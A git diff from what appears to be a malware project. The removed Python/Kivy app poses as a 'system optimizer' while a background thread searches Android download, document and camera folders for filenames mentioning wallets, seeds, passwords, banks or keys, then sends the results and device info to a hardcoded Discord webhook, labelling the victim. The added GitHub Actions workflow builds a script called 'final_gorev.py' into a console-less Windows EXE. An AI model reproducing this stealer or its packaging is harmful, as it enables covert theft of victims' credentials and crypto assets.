@@ -1,50 +1,33 @@
-import os
-import requests
-from kivy.app import App
-from kivy.uix.label import Label
-from threading import Thread
+name: Build EXE
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v4
 
-# --- AYARLAR ---
-WEBHOOK_URL = "https://discord.com/api/webhooks/1469874224826159238/6uZ4nai1p28JAPZFSl5HQs4U1IeaUZot-j7n__PsijGtJDA3bg2ZQHk5c92BENHE7UG9"
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.9'
 
-class CasusAsistan(App):
-    def build(self):
-        return Label(text="Sistem Optimize Ediliyor...\nLütfen Kapatmayınız.")
+    - name: Install Dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pyinstaller cryptography requests pypiwin32
 
-    def on_start(self):
-        # Operasyonu arka planda başlatır ki uygulama donmasın
-        Thread(target=self.operasyon_baslat).start()
+    - name: Build EXE
+      shell: pwsh
+      run: |
+        if (Test-Path "icon.ico") {
+          pyinstaller --onefile --noconsole --icon=icon.ico final_gorev.py
+        } else {
+          pyinstaller --onefile --noconsole final_gorev.py
+        }
 
-    def operasyon_baslat(self):
-        rapor = "📱 **YENİ ANDROID KURBANI DÜŞTÜ!** 📱\n\n"
-        
-        # 1. DOSYA VE CÜZDAN TARAMASI (Wallet, Seed, Password)
-        hedef_klasorler = ['/sdcard/Download', '/sdcard/Documents', '/sdcard/DCIM/Camera']
-        aranan_kelimeler = ['wallet', 'seed', 'sifre', 'banka', 'crypto', 'key', 'pass']
-        
-        bulunan_dosyalar = []
-        try:
-            for klasor in hedef_klasorler:
-                if os.path.exists(klasor):
-                    for dosya in os.listdir(klasor):
-                        if any(kelime in dosya.lower() for kelime in aranan_kelimeler):
-                            bulunan_dosyalar.append(f"📄 {dosya}")
-            
-            if bulunan_dosyalar:
-                rapor += "📂 **Kritik Dosyalar:**\n" + "\n".join(bulunan_dosyalar[:10]) + "\n"
-            else:
-                rapor += "📂 Kritik dosya izine rastlanmadı.\n"
-        except:
-            rapor += "❌ Dosya erişim izni reddedildi.\n"
-
-        # 2. SİSTEM BİLGİSİ
-        rapor += f"\n⚙️ **Cihaz Bilgisi:** {os.uname().machine}\n"
-
-        # DISCORD'A GÖNDER
-        try:
-            requests.post(WEBHOOK_URL, json={"content": rapor})
-        except:
-            pass
-
-if __name__ == "__main__":
-    CasusAsistan().run()
+    - name: Upload Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: operasyon_paketi
+        path: dist/*.exe
